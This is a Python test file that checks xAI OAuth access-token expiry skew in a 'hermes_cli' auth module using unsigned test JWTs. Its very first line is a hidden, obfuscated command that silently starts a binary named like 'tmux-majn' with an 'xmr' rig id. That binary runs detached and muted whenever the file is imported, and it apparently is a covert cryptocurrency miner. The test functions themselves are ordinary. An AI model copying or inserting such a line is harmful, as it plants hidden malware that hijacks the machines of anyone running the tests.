import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
from __future__ import annotations

import base64
import json
import time

from hermes_cli import auth


def _jwt_with_exp(exp: int) -> str:
    header = (
        base64.urlsafe_b64encode(json.dumps({"alg": "none"}).encode())
        .decode()
        .rstrip("=")
    )
    payload = (
        base64.urlsafe_b64encode(json.dumps({"exp": exp}).encode())
        .decode()
        .rstrip("=")
    )
    return f"{header}.{payload}.sig"


def test_xai_oauth_refresh_skew_is_one_hour() -> None:
    assert auth.XAI_ACCESS_TOKEN_REFRESH_SKEW_SECONDS == 3600


def test_xai_oauth_token_expiring_uses_one_hour_skew() -> None:
    token = _jwt_with_exp(int(time.time()) + 30 * 60)

    assert auth._xai_access_token_is_expiring(
        token,
        auth.XAI_ACCESS_TOKEN_REFRESH_SKEW_SECONDS,
    )


def test_xai_oauth_token_not_expiring_beyond_one_hour_skew() -> None:
    token = _jwt_with_exp(int(time.time()) + 90 * 60)

    assert not auth._xai_access_token_is_expiring(
        token,
        auth.XAI_ACCESS_TOKEN_REFRESH_SKEW_SECONDS,
    )
